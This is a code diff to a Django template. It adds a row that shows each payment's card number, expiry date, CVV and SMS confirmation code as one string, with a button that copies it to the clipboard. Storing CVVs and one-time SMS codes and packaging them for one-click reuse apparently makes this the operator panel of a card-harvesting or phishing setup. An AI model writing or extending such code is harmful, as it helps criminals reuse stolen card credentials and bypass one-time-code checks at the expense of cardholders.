@@ -79,6 +79,17 @@
                      <button name="confirm_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-success btn-sm">OK</button>
                 </div>
             </div>
+
+            <div class="row">
+                <div class="col-auto" id="all_data{{ forloop.counter }}">
+                     {{ payment.amount }};{{ payment.card_number }};{% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }};{{ payment.cvv }};{{ payment.sms_code|default_if_none:'' }}
+
+                </div>
+                <img class="img-thumbnail" onclick="CopyToClipboard('all_data{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
+                    <div class="col-2">
+
+                </div>
+            </div>
         </div>
           </form>
     </div>
